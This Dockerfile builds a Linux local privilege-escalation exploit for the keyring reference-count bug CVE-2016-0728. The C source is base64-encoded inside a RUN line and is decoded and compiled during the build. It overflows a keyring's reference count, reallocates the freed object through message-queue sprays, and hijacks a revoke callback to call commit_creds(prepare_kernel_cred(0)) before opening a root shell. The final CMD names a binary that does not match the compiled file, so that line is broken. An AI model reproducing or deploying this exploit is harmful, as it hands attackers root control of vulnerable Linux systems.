FROM Ubuntu:16.04

RUN apt update -y
RUN apt install gcc -y
RUN echo "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8c3lzL3R5cGVzLmg+CiNpbmNsdWRlIDxrZXl1dGlscy5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDx0aW1lLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KCiNpbmNsdWRlIDxzeXMvaXBjLmg+CiNpbmNsdWRlIDxzeXMvbXNnLmg+Cgp0eXBlZGVmIGludCBfX2F0dHJpYnV0ZV9fKChyZWdwYXJtKDMpKSkgKCogX2NvbW1pdF9jcmVkcykodW5zaWduZWQgbG9uZyBjcmVkKTsKdHlwZWRlZiB1bnNpZ25lZCBsb25nIF9fYXR0cmlidXRlX18oKHJlZ3Bhcm0oMykpKSAoKiBfcHJlcGFyZV9rZXJuZWxfY3JlZCkodW5zaWduZWQgbG9uZyBjcmVkKTsKX2NvbW1pdF9jcmVkcyBjb21taXRfY3JlZHM7Cl9wcmVwYXJlX2tlcm5lbF9jcmVkIHByZXBhcmVfa2VybmVsX2NyZWQ7CgojZGVmaW5lIFNUUlVDVF9MRU4gKDB4YjggLSAweDMwKQojZGVmaW5lIENPTU1JVF9DUkVEU19BRERSICgweGZmZmZmZmZmODEwOTQyNTApCiNkZWZpbmUgUFJFUEFSRV9LRVJORUxfQ1JFRFNfQUREUiAoMHhmZmZmZmZmZjgxMDk0NTUwKQoKCgpzdHJ1Y3Qga2V5X3R5cGUgewogICAgY2hhciAqIG5hbWU7CiAgICBzaXplX3QgZGF0YWxlbjsKICAgIHZvaWQgKiB2ZXRfZGVzY3JpcHRpb247CiAgICB2b2lkICogcHJlcGFyc2U7CiAgICB2b2lkICogZnJlZV9wcmVwYXJzZTsKICAgIHZvaWQgKiBpbnN0YW50aWF0ZTsKICAgIHZvaWQgKiB1cGRhdGU7CiAgICB2b2lkICogbWF0Y2hfcHJlcGFyc2U7CiAgICB2b2lkICogbWF0Y2hfZnJlZTsKICAgIHZvaWQgKiByZXZva2U7CiAgICB2b2lkICogZGVzdHJveTsKfTsKCnZvaWQgdXNlcnNwYWNlX3Jldm9rZSh2b2lkICoga2V5KSB7CiAgICBjb21taXRfY3JlZHMocHJlcGFyZV9rZXJuZWxfY3JlZCgwKSk7Cn0KCmludCBtYWluKGludCBhcmdjLCBjb25zdCBjaGFyICphcmd2W10pIHsKCWNvbnN0IGNoYXIgKmtleXJpbmdfbmFtZTsKCXNpemVfdCBpID0gMDsKICAgIHVuc2lnbmVkIGxvbmcgaW50IGwgPSAweDEwMDAwMDAwMC8yOwoJa2V5X3NlcmlhbF90IHNlcmlhbCA9IC0xOwoJcGlkX3QgcGlkID0gLTE7CiAgICBzdHJ1Y3Qga2V5X3R5cGUgKiBteV9rZXlfdHlwZSA9IE5VTEw7CiAgICAKc3RydWN0IHsgbG9uZyBtdHlwZTsKCQljaGFyIG10ZXh0W1NUUlVDVF9MRU5dOwoJfSBtc2cgPSB7MHg0MTQxNDE0MTQxNDE0MTQxLCB7MH19OwoJaW50IG1zcWlkOwoKCWlmIChhcmdjICE9IDIpIHsKCQlwdXRzKCJ1c2FnZTogLi9rZXlzIDxrZXlfbmFtZT4iKTsKCQlyZXR1cm4gMTsKCX0KCiAgICBwcmludGYoInVpZD0lZCwgZXVpZD0lZFxuIiwgZ2V0dWlkKCksIGdldGV1aWQoKSk7IAogICAgY29tbWl0X2NyZWRzID0gKF9jb21taXRfY3JlZHMpIENPTU1JVF9DUkVEU19BRERSOwogICAgcHJlcGFyZV9rZXJuZWxfY3JlZCA9IChfcHJlcGFyZV9rZXJuZWxfY3JlZCkgUFJFUEFSRV9LRVJORUxfQ1JFRFNfQUREUjsKICAgIAogICAgbXlfa2V5X3R5cGUgPSBtYWxsb2Moc2l6ZW9mKCpteV9rZXlfdHlwZSkpOwoKICAgIG15X2tleV90eXBlLT5yZXZva2UgPSAodm9pZCopdXNlcnNwYWNlX3Jldm9rZTsKICAgIG1lbXNldChtc2cubXRleHQsICdBJywgc2l6ZW9mKG1zZy5tdGV4dCkpOwoKICAgIC8vIGtleS0+dWlkCiAgICAqKGludCopKCZtc2cubXRleHRbNTZdKSA9IDB4M2U4OyAvKiBnZXRldWlkKCkgKi8KICAgIC8va2V5LT5wZXJtCiAgICAqKGludCopKCZtc2cubXRleHRbNjRdKSA9IDB4M2YzZjNmM2Y7CgogICAgLy9rZXktPnR5cGUKICAgICoodW5zaWduZWQgbG9uZyAqKSgmbXNnLm10ZXh0WzgwXSkgPSAodW5zaWduZWQgbG9uZylteV9rZXlfdHlwZTsKCiAgICBpZiAoKG1zcWlkID0gbXNnZ2V0KElQQ19QUklWQVRFLCAwNjQ0IHwgSVBDX0NSRUFUKSkgPT0gLTEpIHsKICAgICAgICBwZXJyb3IoIm1zZ2dldCIpOwogICAgICAgIGV4aXQoMSk7CiAgICB9CgogICAga2V5cmluZ19uYW1lID0gYXJndlsxXTsKCgkvKiBTZXQgdGhlIG5ldyBzZXNzaW9uIGtleXJpbmcgYmVmb3JlIHdlIHN0YXJ0ICovCgoJc2VyaWFsID0ga2V5Y3RsKEtFWUNUTF9KT0lOX1NFU1NJT05fS0VZUklORywga2V5cmluZ19uYW1lKTsKCWlmIChzZXJpYWwgPCAwKSB7CgkJcGVycm9yKCJrZXljdGwiKTsKCQlyZXR1cm4gLTE7CiAgICB9CgkKCWlmIChrZXljdGwoS0VZQ1RMX1NFVFBFUk0sIHNlcmlhbCwgS0VZX1BPU19BTEwgfCBLRVlfVVNSX0FMTCB8IEtFWV9HUlBfQUxMIHwgS0VZX09USF9BTEwpIDwgMCkgewoJCXBlcnJvcigia2V5Y3RsIik7CgkJcmV0dXJuIC0xOwoJfQoKCglwdXRzKCJJbmNyZWZpbmcuLi4iKTsKICAgIGZvciAoaSA9IDE7IGkgPCAweGZmZmZmZmZkOyBpKyspIHsKICAgICAgICBpZiAoaSA9PSAoMHhmZmZmZmZmZiAtIGwpKSB7CiAgICAgICAgICAgIGwgPSBsLzI7CiAgICAgICAgICAgIHNsZWVwKDUpOwogICAgICAgIH0KICAgICAgICBpZiAoa2V5Y3RsKEtFWUNUTF9KT0lOX1NFU1NJT05fS0VZUklORywga2V5cmluZ19uYW1lKSA8IDApIHsKICAgICAgICAgICAgcGVycm9yKCJrZXljdGwiKTsKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgIH0KICAgIH0KICAgIHNsZWVwKDUpOwogICAgLyogaGVyZSB3ZSBhcmUgZ29pbmcgdG8gbGVhayB0aGUgbGFzdCByZWZlcmVuY2VzIHRvIG92ZXJmbG93ICovCiAgICBmb3IgKGk9MDsgaTw1OyArK2kpIHsKICAgICAgICBpZiAoa2V5Y3RsKEtFWUNUTF9KT0lOX1NFU1NJT05fS0VZUklORywga2V5cmluZ19uYW1lKSA8IDApIHsKICAgICAgICAgICAgcGVycm9yKCJrZXljdGwiKTsKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgIH0KICAgIH0KCiAgICBwdXRzKCJmaW5pc2hlZCBpbmNyZWZpbmciKTsKICAgIHB1dHMoImZvcmtpbmcuLi4iKTsKICAgIC8qIGFsbG9jYXRlIG1zZyBzdHJ1Y3QgaW4gdGhlIGtlcm5lbCByZXdyaXRpbmcgdGhlIGZyZWVkIGtleXJpbmcgb2JqZWN0ICovCiAgICBmb3IgKGk9MDsgaTw2NDsgaSsrKSB7CiAgICAgICAgcGlkID0gZm9yaygpOwogICAgICAgIGlmIChwaWQgPT0gLTEpIHsKICAgICAgICAgICAgcGVycm9yKCJmb3JrIik7CiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICB9CgogICAgICAgIGlmIChwaWQgPT0gMCkgewogICAgICAgICAgICBzbGVlcCgyKTsKICAgICAgICAgICAgaWYgKChtc3FpZCA9IG1zZ2dldChJUENfUFJJVkFURSwgMDY0NCB8IElQQ19DUkVBVCkpID09IC0xKSB7CiAgICAgICAgICAgICAgICBwZXJyb3IoIm1zZ2dldCIpOwogICAgICAgICAgICAgICAgZXhpdCgxKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBmb3IgKGkgPSAwOyBpIDwgNjQ7IGkrKykgewogICAgICAgICAgICAgICAgaWYgKG1zZ3NuZChtc3FpZCwgJm1zZywgc2l6ZW9mKG1zZy5tdGV4dCksIDApID09IC0xKSB7CiAgICAgICAgICAgICAgICAgICAgcGVycm9yKCJtc2dzbmQiKTsKICAgICAgICAgICAgICAgICAgICBleGl0KDEpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHNsZWVwKC0xKTsKICAgICAgICAgICAgZXhpdCgxKTsKICAgICAgICB9CiAgICB9CiAgIAogICAgcHV0cygiZmluaXNoZWQgZm9ya2luZyIpOwogICAgc2xlZXAoNSk7CgogICAgLyogY2FsbCB1c2Vyc3BhY2VfcmV2b2tlIGZyb20ga2VybmVsICovCiAgICBwdXRzKCJjYWxpbmcgcmV2b2tlLi4uIik7CiAgICBpZiAoa2V5Y3RsKEtFWUNUTF9SRVZPS0UsIEtFWV9TUEVDX1NFU1NJT05fS0VZUklORykgPT0gLTEpIHsKICAgICAgICBwZXJyb3IoImtleWN0bF9yZXZva2UiKTsKICAgIH0KCiAgICBwcmludGYoInVpZD0lZCwgZXVpZD0lZFxuIiwgZ2V0dWlkKCksIGdldGV1aWQoKSk7CiAgICBleGVjbCgiL2Jpbi9zaCIsICIvYmluL3NoIiwgTlVMTCk7CgogICAgcmV0dXJuIDA7Cn0=" | base64 -d > cve_2016_0728.c
RUN gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall 

CMD ["./cve_2016_072 PP_KEY"]